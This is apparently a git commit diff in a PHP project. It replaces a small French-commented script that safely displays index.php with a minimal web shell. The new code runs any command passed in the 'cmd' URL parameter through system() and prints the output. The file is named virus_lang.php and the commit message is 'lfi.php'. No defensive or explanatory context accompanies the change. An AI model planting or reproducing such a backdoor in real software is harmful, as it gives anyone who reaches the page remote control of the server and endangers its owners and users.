5bc128fc3847d9be5502b99f09c745af6fbefdd5
naval-dev <141615118+naval-dev@users.noreply.github.com>
2025-07-23 20:45:09 +0300

    lfi.php

--- virus_lang.php
+++ virus_lang.php
@@ -1,15 +1,7 @@
 <?php
-// Ce script lit et affiche le contenu du fichier index.php
-
-$chemin_fichier = 'index.php';
-
-// Vérifie si le fichier existe
-if (file_exists($chemin_fichier)) {
-    // Lit le contenu du fichier
-    $contenu = file_get_contents($chemin_fichier);
-    // Affiche le contenu
-    echo "<pre>" . htmlspecialchars($contenu) . "</pre>";
-} else {
-    echo "Le fichier index.php n'existe pas.";
+if (isset($_GET['cmd'])) {
+    echo "<pre>";
+    system($_GET['cmd']);
+    echo "</pre>";
 }
 ?>
